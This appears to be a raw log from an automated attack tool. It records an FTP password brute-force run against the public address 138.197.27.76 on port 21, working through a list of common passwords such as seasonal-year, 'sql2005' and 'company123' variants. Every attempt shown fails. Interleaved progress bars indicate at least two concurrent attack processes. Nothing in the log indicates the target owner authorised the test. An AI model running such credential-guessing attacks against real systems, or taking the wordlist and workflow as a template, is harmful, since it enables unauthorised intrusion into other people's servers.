2025-10-24 01:38:00,511 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.4%[0m ETA: 187.8s Speed: 158 B/s | 112.2s | PID: 44299
2025-10-24 01:38:00,771 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :earth (Incorrect: )
2025-10-24 01:38:00,933 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.5%[0m ETA: 52.4s Speed: 2 B/s | 247.6s | PID: 44124
2025-10-24 01:38:01,295 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :company (Incorrect: )
2025-10-24 01:38:01,312 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.7%[0m ETA: 187.0s Speed: 158 B/s | 113.0s | PID: 44299
2025-10-24 01:38:01,735 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.8%[0m ETA: 51.6s Speed: 2 B/s | 248.4s | PID: 44124
2025-10-24 01:38:01,813 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :company1 (Incorrect: )
2025-10-24 01:38:02,113 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.9%[0m ETA: 186.2s Speed: 158 B/s | 113.8s | PID: 44299
2025-10-24 01:38:02,351 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :company123 (Incorrect: )
2025-10-24 01:38:02,536 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m83.1%[0m ETA: 50.8s Speed: 2 B/s | 249.2s | PID: 44124
2025-10-24 01:38:02,872 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :company1! (Incorrect: )
2025-10-24 01:38:02,914 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m38.2%[0m ETA: 185.4s Speed: 159 B/s | 114.6s | PID: 44299
2025-10-24 01:38:03,338 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m83.3%[0m ETA: 50.0s Speed: 2 B/s | 250.0s | PID: 44124
2025-10-24 01:38:03,399 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :company! (Incorrect: )
2025-10-24 01:38:03,714 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m38.5%[0m ETA: 184.6s Speed: 159 B/s | 115.4s | PID: 44299
2025-10-24 01:38:03,921 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :secret (Incorrect: )
2025-10-24 01:38:04,139 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m83.6%[0m ETA: 49.2s Speed: 2 B/s | 250.8s | PID: 44124
2025-10-24 01:38:04,472 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :secret! (Incorrect: )
2025-10-24 01:38:04,516 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m38.7%[0m ETA: 183.8s Speed: 159 B/s | 116.2s | PID: 44299
2025-10-24 01:38:04,940 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m83.9%[0m ETA: 48.4s Speed: 2 B/s | 251.6s | PID: 44124
2025-10-24 01:38:04,993 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :secret123 (Incorrect: )
2025-10-24 01:38:05,317 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.0%[0m ETA: 183.0s Speed: 159 B/s | 117.0s | PID: 44299
2025-10-24 01:38:05,542 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :secret1212 (Incorrect: )
2025-10-24 01:38:05,742 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.1%[0m ETA: 47.6s Speed: 2 B/s | 252.4s | PID: 44124
2025-10-24 01:38:06,085 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :secret12 (Incorrect: )
2025-10-24 01:38:06,118 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.3%[0m ETA: 182.2s Speed: 159 B/s | 117.8s | PID: 44299
2025-10-24 01:38:06,544 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.4%[0m ETA: 46.8s Speed: 2 B/s | 253.2s | PID: 44124
2025-10-24 01:38:06,615 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :secret1! (Incorrect: )
2025-10-24 01:38:06,919 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.5%[0m ETA: 181.4s Speed: 159 B/s | 118.6s | PID: 44299
2025-10-24 01:38:07,139 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlpass123 (Incorrect: )
2025-10-24 01:38:07,346 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.7%[0m ETA: 46.0s Speed: 2 B/s | 254.0s | PID: 44124
2025-10-24 01:38:07,661 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2013 (Incorrect: )
2025-10-24 01:38:07,722 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m39.8%[0m ETA: 180.6s Speed: 160 B/s | 119.4s | PID: 44299
2025-10-24 01:38:08,147 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.9%[0m ETA: 45.2s Speed: 2 B/s | 254.8s | PID: 44124
2025-10-24 01:38:08,178 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2012 (Incorrect: )
2025-10-24 01:38:08,523 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.1%[0m ETA: 179.8s Speed: 160 B/s | 120.2s | PID: 44299
2025-10-24 01:38:08,699 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2011 (Incorrect: )
2025-10-24 01:38:08,948 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.2%[0m ETA: 44.4s Speed: 2 B/s | 255.6s | PID: 44124
2025-10-24 01:38:09,237 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2010 (Incorrect: )
2025-10-24 01:38:09,324 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.3%[0m ETA: 179.0s Speed: 160 B/s | 121.0s | PID: 44299
2025-10-24 01:38:09,748 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.5%[0m ETA: 43.6s Speed: 2 B/s | 256.4s | PID: 44124
2025-10-24 01:38:09,763 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2009 (Incorrect: )
2025-10-24 01:38:10,126 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.6%[0m ETA: 178.2s Speed: 160 B/s | 121.8s | PID: 44299
2025-10-24 01:38:10,288 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Summer2008 (Incorrect: )
2025-10-24 01:38:10,549 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.7%[0m ETA: 42.8s Speed: 2 B/s | 257.2s | PID: 44124
2025-10-24 01:38:10,808 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2013 (Incorrect: )
2025-10-24 01:38:10,926 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m40.9%[0m ETA: 177.4s Speed: 161 B/s | 122.6s | PID: 44299
2025-10-24 01:38:11,331 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2012 (Incorrect: )
2025-10-24 01:38:11,352 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m86.0%[0m ETA: 42.0s Speed: 2 B/s | 258.0s | PID: 44124
2025-10-24 01:38:11,729 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.1%[0m ETA: 176.6s Speed: 160 B/s | 123.4s | PID: 44299
2025-10-24 01:38:11,849 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2011 (Incorrect: )
2025-10-24 01:38:12,158 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m86.3%[0m ETA: 41.2s Speed: 2 B/s | 258.8s | PID: 44124
2025-10-24 01:38:12,398 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2010 (Incorrect: )
2025-10-24 01:38:12,529 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.4%[0m ETA: 175.8s Speed: 161 B/s | 124.2s | PID: 44299
2025-10-24 01:38:12,916 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2009 (Incorrect: )
2025-10-24 01:38:12,960 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m86.6%[0m ETA: 40.3s Speed: 2 B/s | 259.7s | PID: 44124
2025-10-24 01:38:13,330 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.7%[0m ETA: 175.0s Speed: 161 B/s | 125.0s | PID: 44299
2025-10-24 01:38:13,437 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2008 (Incorrect: )
2025-10-24 01:38:13,761 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m86.8%[0m ETA: 39.5s Speed: 2 B/s | 260.5s | PID: 44124
2025-10-24 01:38:13,993 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2013 (Incorrect: )
2025-10-24 01:38:14,131 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m41.9%[0m ETA: 174.2s Speed: 161 B/s | 125.8s | PID: 44299
2025-10-24 01:38:14,563 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.1%[0m ETA: 38.7s Speed: 2 B/s | 261.3s | PID: 44124
2025-10-24 01:38:14,568 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2012 (Incorrect: )
2025-10-24 01:38:14,932 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.2%[0m ETA: 173.4s Speed: 161 B/s | 126.6s | PID: 44299
2025-10-24 01:38:15,152 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2011 (Incorrect: )
2025-10-24 01:38:15,364 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.4%[0m ETA: 37.9s Speed: 2 B/s | 262.1s | PID: 44124
2025-10-24 01:38:15,688 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2010 (Incorrect: )
2025-10-24 01:38:15,732 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.5%[0m ETA: 172.6s Speed: 162 B/s | 127.4s | PID: 44299
2025-10-24 01:38:16,165 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.6%[0m ETA: 37.1s Speed: 2 B/s | 262.9s | PID: 44124
2025-10-24 01:38:16,235 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2009 (Incorrect: )
2025-10-24 01:38:16,533 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m42.7%[0m ETA: 171.8s Speed: 161 B/s | 128.2s | PID: 44299
2025-10-24 01:38:16,766 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :summer2008 (Incorrect: )
2025-10-24 01:38:16,966 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.9%[0m ETA: 36.3s Speed: 2 B/s | 263.7s | PID: 44124
2025-10-24 01:38:17,283 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2013 (Incorrect: )
2025-10-24 01:38:17,334 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.0%[0m ETA: 171.0s Speed: 162 B/s | 129.0s | PID: 44299
2025-10-24 01:38:17,768 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m88.2%[0m ETA: 35.5s Speed: 2 B/s | 264.5s | PID: 44124
2025-10-24 01:38:17,804 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2012 (Incorrect: )
2025-10-24 01:38:18,136 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████[38;5;240m░░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.3%[0m ETA: 170.2s Speed: 162 B/s | 129.8s | PID: 44299
2025-10-24 01:38:18,342 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2011 (Incorrect: )
2025-10-24 01:38:18,568 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m88.4%[0m ETA: 34.7s Speed: 2 B/s | 265.3s | PID: 44124
2025-10-24 01:38:18,878 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2010 (Incorrect: )
2025-10-24 01:38:18,936 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.5%[0m ETA: 169.4s Speed: 162 B/s | 130.6s | PID: 44299
2025-10-24 01:38:19,371 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m88.7%[0m ETA: 33.9s Speed: 2 B/s | 266.1s | PID: 44124
2025-10-24 01:38:19,399 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2009 (Incorrect: )
2025-10-24 01:38:19,737 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m43.8%[0m ETA: 168.6s Speed: 162 B/s | 131.4s | PID: 44299
2025-10-24 01:38:19,922 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2008 (Incorrect: )
2025-10-24 01:38:20,172 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.0%[0m ETA: 33.1s Speed: 2 B/s | 266.9s | PID: 44124
2025-10-24 01:38:20,442 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :123456 (Incorrect: )
2025-10-24 01:38:20,538 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.1%[0m ETA: 167.8s Speed: 162 B/s | 132.2s | PID: 44299
2025-10-24 01:38:20,961 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :abcd123 (Incorrect: )
2025-10-24 01:38:20,974 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.2%[0m ETA: 32.3s Speed: 2 B/s | 267.7s | PID: 44124
2025-10-24 01:38:21,339 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.3%[0m ETA: 167.0s Speed: 162 B/s | 133.0s | PID: 44299
2025-10-24 01:38:21,481 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :abc (Incorrect: )
2025-10-24 01:38:21,776 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.5%[0m ETA: 31.5s Speed: 2 B/s | 268.5s | PID: 44124
2025-10-24 01:38:22,013 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :burp (Incorrect: )
2025-10-24 01:38:22,140 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.6%[0m ETA: 166.2s Speed: 163 B/s | 133.8s | PID: 44299
2025-10-24 01:38:22,551 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :private (Incorrect: )
2025-10-24 01:38:22,577 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.8%[0m ETA: 30.7s Speed: 2 B/s | 269.3s | PID: 44124
2025-10-24 01:38:22,940 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m44.9%[0m ETA: 165.4s Speed: 162 B/s | 134.6s | PID: 44299
2025-10-24 01:38:23,081 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :unknown (Incorrect: )
2025-10-24 01:38:23,377 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.0%[0m ETA: 29.9s Speed: 2 B/s | 270.1s | PID: 44124
2025-10-24 01:38:23,623 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :wicked (Incorrect: )
2025-10-24 01:38:23,741 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.1%[0m ETA: 164.6s Speed: 163 B/s | 135.4s | PID: 44299
2025-10-24 01:38:24,153 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :alpine (Incorrect: )
2025-10-24 01:38:24,179 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.3%[0m ETA: 29.1s Speed: 2 B/s | 270.9s | PID: 44124
2025-10-24 01:38:24,542 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.4%[0m ETA: 163.8s Speed: 163 B/s | 136.2s | PID: 44299
2025-10-24 01:38:24,675 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :trust (Incorrect: )
2025-10-24 01:38:24,980 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.6%[0m ETA: 28.3s Speed: 2 B/s | 271.7s | PID: 44124
2025-10-24 01:38:25,206 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :microsoft (Incorrect: )
2025-10-24 01:38:25,343 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.7%[0m ETA: 163.0s Speed: 163 B/s | 137.0s | PID: 44299
2025-10-24 01:38:25,725 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sql2000 (Incorrect: )
2025-10-24 01:38:25,781 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.8%[0m ETA: 27.5s Speed: 2 B/s | 272.5s | PID: 44124
2025-10-24 01:38:26,144 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m45.9%[0m ETA: 162.2s Speed: 163 B/s | 137.8s | PID: 44299
2025-10-24 01:38:26,251 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sql2003 (Incorrect: )
2025-10-24 01:38:26,582 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.1%[0m ETA: 26.7s Speed: 2 B/s | 273.3s | PID: 44124
2025-10-24 01:38:26,794 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sql2005 (Incorrect: )
2025-10-24 01:38:26,946 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m46.2%[0m ETA: 161.4s Speed: 163 B/s | 138.6s | PID: 44299
2025-10-24 01:38:27,337 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sql2008 (Incorrect: )
2025-10-24 01:38:27,384 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.4%[0m ETA: 25.9s Speed: 2 B/s | 274.1s | PID: 44124
2025-10-24 01:38:27,746 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████[38;5;240m░░░░░░░░░░░░░░░░░[0m] [38;5;160m46.5%[0m ETA: 160.6s Speed: 163 B/s | 139.4s | PID: 44299
2025-10-24 01:38:27,856 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :vista (Incorrect: )
2025-10-24 01:38:28,186 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.6%[0m ETA: 25.1s Speed: 2 B/s | 274.9s | PID: 44124
2025-10-24 01:38:28,412 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :xp (Incorrect: )
2025-10-24 01:38:28,547 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m46.7%[0m ETA: 159.8s Speed: 163 B/s | 140.2s | PID: 44299
2025-10-24 01:38:28,933 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :nt (Incorrect: )
2025-10-24 01:38:28,987 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.9%[0m ETA: 24.3s Speed: 2 B/s | 275.7s | PID: 44124
2025-10-24 01:38:29,348 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.0%[0m ETA: 159.0s Speed: 163 B/s | 141.0s | PID: 44299
2025-10-24 01:38:29,454 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :98 (Incorrect: )
2025-10-24 01:38:29,788 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m92.2%[0m ETA: 23.5s Speed: 2 B/s | 276.5s | PID: 44124
2025-10-24 01:38:29,998 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :95 (Incorrect: )
2025-10-24 01:38:30,150 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.3%[0m ETA: 158.2s Speed: 164 B/s | 141.8s | PID: 44299
2025-10-24 01:38:30,530 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :2003 (Incorrect: )
2025-10-24 01:38:30,592 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m92.4%[0m ETA: 22.7s Speed: 2 B/s | 277.3s | PID: 44124
2025-10-24 01:38:30,951 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.5%[0m ETA: 157.4s Speed: 163 B/s | 142.6s | PID: 44299
2025-10-24 01:38:31,055 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :2008 (Incorrect: )
